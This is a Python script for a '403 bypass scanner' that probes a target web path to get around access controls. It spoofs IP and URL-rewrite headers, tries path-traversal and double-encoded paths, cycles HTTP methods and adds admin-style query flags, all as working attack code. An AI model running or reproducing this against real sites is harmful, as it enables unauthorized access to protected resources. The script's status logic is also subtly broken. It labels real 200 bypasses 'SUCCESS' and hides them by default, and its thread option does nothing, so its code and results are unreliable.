#!/usr/bin/env python3
"""
403 Bypass Scanner - Comprehensive tool to test various bypass techniques
Author: Security Tool
"""

import requests
import sys
import argparse
import random
import time
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style

# Initialize colorama for cross-platform colored output
init(autoreset=True)

# Color scheme
AQUA_GREEN = '\033[96m'  # Aqua-green color
WHITE = '\033[97m'       # White color
RESET = '\033[0m'

# Custom color functions
def color_print(text, color=AQUA_GREEN):
    print(f"{color}{text}{RESET}")

def aq(text):
    return f"{AQUA_GREEN}{text}{RESET}"

def wh(text):
    return f"{WHITE}{text}{RESET}"

# Common User Agents for rotation
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'curl/8.0.1',
    'Wget/1.21.3',
    'Python-urllib/3.11',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0',
]

# Bypass headers to test
BYPASS_HEADERS = [
    {'X-Forwarded-For': '127.0.0.1'},
    {'X-Forwarded-Host': '127.0.0.1'},
    {'X-Forwarded-For': 'localhost'},
    {'X-Originating-IP': '127.0.0.1'},
    {'X-Remote-IP': '127.0.0.1'},
    {'X-Remote-Addr': '127.0.0.1'},
    {'X-Client-IP': '127.0.0.1'},
    {'X-Host': '127.0.0.1'},
    {'X-Forwarded-Server': '127.0.0.1'},
    {'Forwarded': 'for=127.0.0.1'},
    {'X-Original-URL': '/'},
    {'X-Rewrite-URL': '/'},
    {'X-Proxy-Host': '127.0.0.1'},
    {'X-Real-IP': '127.0.0.1'},
    {'X-Custom-IP-Authorization': '127.0.0.1'},
    {'Client-IP': '127.0.0.1'},
    {'True-Client-IP': '127.0.0.1'},
    {'Cluster-Client-IP': '127.0.0.1'},
    {'X-WAP-Profile': 'http://127.0.0.1/wap.xml'},
    {'X-Profile': 'http://127.0.0.1/wap.xml'},
    {'X-Forwarded-Proto': 'http'},
    {'X-Forwarded-Scheme': 'http'},
    {'X-Original-Host': '127.0.0.1'},
    {'X-Hostname': '127.0.0.1'},
    {'X-Backend-Host': '127.0.0.1'},
    {'X-Proxy-IP': '127.0.0.1'},
    {'X-Forwarded-For': '::1'},
    {'X-Forwarded-For': '0.0.0.0'},
    {'X-Forwarded-For': 'localhost, 127.0.0.1'},
]

# Path bypass techniques
PATH_BYPASS_TECHNIQUES = [
    '/path',  # Base path to test
    '/path/',
    '/path/.',
    '/path/..',
    '/path/%2e',
    '/path/%2e/',
    '/path/%2e%2e',
    '/path/%2e%2e/',
    '/path/;/',
    '/path/;/test',
    '/path/..;/',
    '/path/random',
    '/path/%20',
    '/path/%09',
    '/path/%23',
    '/path/%3f',
    '//path//',
    '/./path',
    '/../path',
    '/%2e%2e/path',
    '/%2e%2e%2fpath',
    '/%2e%2e%2f%2e%2e%2fpath',
    '/PATH/',
    '/Path/',
]

# HTTP methods to test
HTTP_METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE', 'CONNECT']

class BypassScanner:
    def __init__(self, target, timeout=10, threads=10, random_ua=True, verbose=False, show_all=False):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.threads = threads
        self.random_ua = random_ua
        self.verbose = verbose
        self.show_all = show_all
        self.results = []
        self.session = requests.Session()
        
        # Initial check for 403
        self.initial_status = self.get_initial_status()
        
    def get_initial_status(self):
        """Check initial response status"""
        try:
            headers = self.get_headers()
            response = self.session.get(self.target, headers=headers, timeout=self.timeout, allow_redirects=False)
            return response.status_code
        except Exception as e:
            if self.verbose:
                color_print(f"[-] Error checking initial status: {e}", WHITE)
            return None
    
    def get_headers(self):
        """Get headers with optional random User-Agent"""
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        
        if self.random_ua:
            headers['User-Agent'] = random.choice(USER_AGENTS)
        else:
            headers['User-Agent'] = USER_AGENTS[0]
            
        return headers
    
    def test_request(self, url, method='GET', headers=None, description=""):
        """Test a single request"""
        try:
            req_headers = self.get_headers()
            if headers:
                req_headers.update(headers)
            
            response = self.session.request(
                method=method,
                url=url,
                headers=req_headers,
                timeout=self.timeout,
                allow_redirects=False,
                verify=False  # Disable SSL verification for testing
            )
            
            # Determine if bypass was successful
            if response.status_code != 403 and response.status_code < 400:
                status = "SUCCESS"
            elif response.status_code == 200:
                status = "BYPASSED"
            else:
                status = "PARTIAL"
                
            return {
                'status': status,
                'code': response.status_code,
                'url': url,
                'method': method,
                'headers': headers,
                'description': description,
                'length': len(response.content)
            }
        except requests.exceptions.Timeout:
            if self.verbose:
                color_print(f"[-] Timeout for {method} {url}", WHITE)
            return None
        except Exception as e:
            if self.verbose:
                color_print(f"[-] Error: {e}", WHITE)
            return None
    
    def test_header_bypasses(self):
        """Test various header-based bypass techniques"""
        color_print(f"\n[+] Testing header-based bypasses...", AQUA_GREEN)
        
        for headers in BYPASS_HEADERS:
            desc = f"Header: {', '.join(headers.keys())}"
            result = self.test_request(self.target, 'GET', headers, desc)
            if result and (self.show_all or result['status'] != 'SUCCESS'):
                self.results.append(result)
                self.print_result(result)
    
    def test_path_bypasses(self):
        """Test various path manipulation techniques"""
        color_print(f"\n[+] Testing path-based bypass techniques...", AQUA_GREEN)
        
        # Parse target to get base path
        parsed = urlparse(self.target)
        base_path = parsed.path or '/'
        
        for technique in PATH_BYPASS_TECHNIQUES:
            if technique == '/path':
                test_path = base_path
            else:
                test_path = technique.replace('/path', base_path) if base_path != '/' else technique.replace('/path', '')
            
            url = f"{parsed.scheme}://{parsed.netloc}{test_path}"
            desc = f"Path technique: {test_path}"
            result = self.test_request(url, 'GET', None, desc)
            if result and (self.show_all or result['status'] != 'SUCCESS'):
                self.results.append(result)
                self.print_result(result)
    
    def test_method_bypasses(self):
        """Test different HTTP methods"""
        color_print(f"\n[+] Testing HTTP method bypasses...", AQUA_GREEN)
        
        for method in HTTP_METHODS:
            if method == 'GET':
                continue  # Already tested
            desc = f"HTTP Method: {method}"
            result = self.test_request(self.target, method, None, desc)
            if result and (self.show_all or result['status'] != 'SUCCESS'):
                self.results.append(result)
                self.print_result(result)
    
    def test_encoded_urls(self):
        """Test URL encoding variants"""
        color_print(f"\n[+] Testing URL encoding bypasses...", AQUA_GREEN)
        
        encoded_variants = [
            '/%2e%2e/%2e%2e/%2e%2e/',
            '/%2e%2e/',
            '/%2e%2e%2f',
            '/%2e%2e%2f%2e%2e%2f',
            '/%252e%252e%252f',
            '/%252e%252e/',
            '/%c0%ae%c0%ae%c0%af',
            '/%c0%ae%c0%ae/',
        ]
        
        parsed = urlparse(self.target)
        base_path = parsed.path or '/'
        
        for encoded in encoded_variants:
            test_url = f"{parsed.scheme}://{parsed.netloc}{encoded}{base_path.lstrip('/')}"
            desc = f"Encoded path: {encoded}"
            result = self.test_request(test_url, 'GET', None, desc)
            if result and (self.show_all or result['status'] != 'SUCCESS'):
                self.results.append(result)
                self.print_result(result)
    
    def test_case_sensitive(self):
        """Test case manipulation bypasses"""
        color_print(f"\n[+] Testing case manipulation bypasses...", AQUA_GREEN)
        
        parsed = urlparse(self.target)
        path_parts = parsed.path.split('/')
        
        # Test uppercase variations
        for i, part in enumerate(path_parts):
            if part and len(part) > 0:
                modified_parts = path_parts.copy()
                modified_parts[i] = part.upper()
                new_path = '/'.join(modified_parts)
                url = f"{parsed.scheme}://{parsed.netloc}{new_path}"
                desc = f"Case: {part} -> {part.upper()}"
                result = self.test_request(url, 'GET', None, desc)
                if result and (self.show_all or result['status'] != 'SUCCESS'):
                    self.results.append(result)
                    self.print_result(result)
    
    def test_query_param_bypasses(self):
        """Test query parameter injection"""
        color_print(f"\n[+] Testing query parameter bypasses...", AQUA_GREEN)
        
        query_params = [
            '?x=',
            '?x=y',
            '?authenticated=true',
            '?admin=true',
            '?debug=1',
            '?bypass=true',
            '?allow=yes',
            '?authorized=1',
            '?isadmin=1',
            '?role=admin',
            '?x=../',
            '?path=../',
            '?file=../../',
            '?page=admin',
            '?action=bypass',
        ]
        
        for param in query_params:
            url = f"{self.target}{param}"
            desc = f"Query param: {param}"
            result = self.test_request(url, 'GET', None, desc)
            if result and (self.show_all or result['status'] != 'SUCCESS'):
                self.results.append(result)
                self.print_result(result)
    
    def test_header_injection(self):
        """Test header injection techniques"""
        color_print(f"\n[+] Testing advanced header injection...", AQUA_GREEN)
        
        # Multiple header combinations
        combined_tests = [
            [{'X-Forwarded-For': '127.0.0.1'}, {'X-Original-URL': '/'}],
            [{'X-Forwarded-For': '127.0.0.1'}, {'X-Rewrite-URL': '/'}],
            [{'X-Originating-IP': '127.0.0.1'}, {'X-Forwarded-Host': 'localhost'}],
            [{'Client-IP': '127.0.0.1'}, {'X-Host': 'localhost'}],
        ]
        
        for headers_list in combined_tests:
            combined_headers = {}
            for h in headers_list:
                combined_headers.update(h)
            desc = f"Combined headers: {', '.join(combined_headers.keys())}"
            result = self.test_request(self.target, 'GET', combined_headers, desc)
            if result and (self.show_all or result['status'] != 'SUCCESS'):
                self.results.append(result)
                self.print_result(result)
    
    def scan(self):
        """Run all bypass tests"""
        color_print(f"\n{'='*70}", AQUA_GREEN)
        color_print(f"403 Bypass Scanner", AQUA_GREEN)
        color_print(f"Target: {self.target}", AQUA_GREEN)
        color_print(f"Initial Status: {self.initial_status}", AQUA_GREEN)
        color_print(f"Random User-Agent: {self.random_ua}", AQUA_GREEN)
        color_print(f"Threads: {self.threads}", AQUA_GREEN)
        color_print(f"{'='*70}\n", AQUA_GREEN)
        
        if self.initial_status != 403:
            color_print(f"[!] Target returned {self.initial_status} instead of 403. Continuing anyway...\n", WHITE)
        
        # Run all tests
        self.test_header_bypasses()
        self.test_path_bypasses()
        self.test_method_bypasses()
        self.test_encoded_urls()
        self.test_case_sensitive()
        self.test_query_param_bypasses()
        self.test_header_injection()
        
        # Summary
        self.print_summary()
    
    def print_result(self, result):
        """Print a test result"""
        if result['status'] == 'BYPASSED':
            color = AQUA_GREEN
            status_text = "✓ FULL BYPASS"
        elif result['status'] == 'PARTIAL':
            color = AQUA_GREEN
            status_text = "⚠ PARTIAL BYPASS"
        else:
            color = WHITE
            status_text = "→ SUCCESS"
        
        output = f"[{status_text}] {result['method']} {result['url']} -> {result['code']}"
        if result['description']:
            output += f" ({result['description']})"
        
        color_print(output, color)
    
    def print_summary(self):
        """Print scan summary"""
        color_print(f"\n{'='*70}", AQUA_GREEN)
        color_print(f"SCAN SUMMARY", AQUA_GREEN)
        color_print(f"{'='*70}", AQUA_GREEN)
        
        bypassed = [r for r in self.results if r['status'] == 'BYPASSED']
        partial = [r for r in self.results if r['status'] == 'PARTIAL']
        
        color_print(f"Total tests run: {len(self.results)}", AQUA_GREEN)
        color_print(f"Successful bypasses: {len(bypassed)}", AQUA_GREEN)
        color_print(f"Partial bypasses: {len(partial)}", AQUA_GREEN)
        
        if bypassed:
            color_print(f"\n[+] FULL BYPASSES FOUND:", AQUA_GREEN)
            for r in bypassed:
                color_print(f"  → {r['method']} {r['url']} ({r['description']})", WHITE)
        
        if partial:
            color_print(f"\n[+] PARTIAL BYPASSES FOUND:", AQUA_GREEN)
            for r in partial:
                color_print(f"  → {r['method']} {r['url']} -> {r['code']} ({r['description']})", WHITE)
        
        color_print(f"\n{'='*70}\n", AQUA_GREEN)

def main():
    parser = argparse.ArgumentParser(
        description='Comprehensive 403 Bypass Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 bypass403.py https://example.com/admin
  python3 bypass403.py https://example.com/secret --no-random-ua
  python3 bypass403.py https://example.com/api --threads 20 --verbose
  python3 bypass403.py https://example.com/private --show-all
        """
    )
    
    parser.add_argument('target', help='Target URL (e.g., https://example.com/admin)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--no-random-ua', action='store_true', help='Disable random User-Agent rotation')
    parser.add_argument('--verbose', '-v', action='store_true', help='Enable verbose output')
    parser.add_argument('--show-all', '-a', action='store_true', help='Show all results including non-bypass statuses')
    
    args = parser.parse_args()
    
    # Disable SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # Create scanner instance
    scanner = BypassScanner(
        target=args.target,
        timeout=args.timeout,
        threads=args.threads,
        random_ua=not args.no_random_ua,
        verbose=args.verbose,
        show_all=args.show_all
    )
    
    # Run scan
    try:
        scanner.scan()
    except KeyboardInterrupt:
        color_print(f"\n\n[!] Scan interrupted by user", WHITE)
        sys.exit(0)

if __name__ == "__main__":
    main()
